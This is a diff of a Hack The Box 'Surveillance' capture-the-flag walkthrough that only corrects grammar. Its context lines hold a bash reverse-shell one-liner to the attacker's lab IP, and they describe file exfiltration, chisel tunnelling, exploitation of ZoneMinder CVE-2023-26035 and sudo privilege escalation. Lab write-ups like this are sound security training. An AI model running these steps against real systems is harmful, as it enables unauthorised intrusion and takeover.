@@ -100,7 +100,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
 ```
 # Privilege Escalation to Matthew 
 
-While enumerating the system we can see two users (other than root) Matthew & ZoneMinder. After looking around I find a backup directory containing a zip file which is containts SQL backup file:
+While enumerating the system we can see two users (other than root) Matthew & ZoneMinder. After looking around I found a backup directory containing a zip file which is contains SQL backup file:
 
 * **Path:**  /var/www/html/craft/storage/backups
 We transfer the file to our machine for inspection:
@@ -144,7 +144,7 @@ netstat -tunlp
 
 ![Alt text](/assets/images/htb-writeup-survellance/surv7.png)
 
-I check with curl the page but it turn to be a lot of HTML code so i decided to make a port forwarding with *chisel*.
+I checked the page with curl but it turned out to be a lot of HTML code so i decided to make a port forwarding with *chisel*.
 
 ```bash
 #on Attacking machine 
@@ -160,12 +160,12 @@ I check with curl the page but it turn to be a lot of HTML code so i decided to 
 ![Alt text](/assets/images/htb-writeup-survellance/surv8.png)
 
 
-After stablishing the connection on my socks tunnel I am able to connect to the page hosted on localhost:8080 and that is when I realise that ***ZoneMinder*** more than an user its a service/software.
+After establishing the connection on my socks tunnel I am able to connect to the page hosted on localhost:8080 and that is when I realise that ***ZoneMinder*** more than an user its a service/software.
 
 ![Alt text](/assets/images/htb-writeup-survellance/surv9.png)
 
 Then i look for zoneminder exploits on google and I encounter with **CVE-2023-26035**: "Unauthenticated Remote Code Execution in ZoneMinder"
-I wasn't able to find any type of information related to the version, but since it seemed a easy exploit to run i decided to give it a try. Also taking into account the year of the *CVE* it looked that it could be a possible way of attacking
+I wasn't able to find any type of information related to the version, but since it seemed to be a easy exploit to run i decided to give it a try. Also taking into account the year of the *CVE* it looked that it could be a possible way of attacking
 
 The vulnerability lies in the way ZoneMinder handles the "snapshot" function. This function is supposed to capture an image from a connected security camera. However, due to a missing authorization check, *an attacker can manipulate this function to create a new monitor instead of fetching an existing one*. By crafting a specially crafted request, the attacker can inject malicious code that gets executed by the ZoneMinder server.
 
@@ -190,7 +190,7 @@ Checking for sudo privileges, we find that the zoneminder user can run scripts m
 
  i look online for *"escalate priviles zoneminder zm.pl"* and i found an interesting [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw) page talking about something related.
 
-The Security advisory basically says that this is affecting version < 1.36.33. I check our working version, since I did not knew if it was affected by the issue mentioned before
+The Security advisory basically says that this is affecting version < 1.36.33. I check our working version, since I did not know if it was affected by the issue mentioned before
 
 ```bash
 dpkg -s zoneminder | grep Version
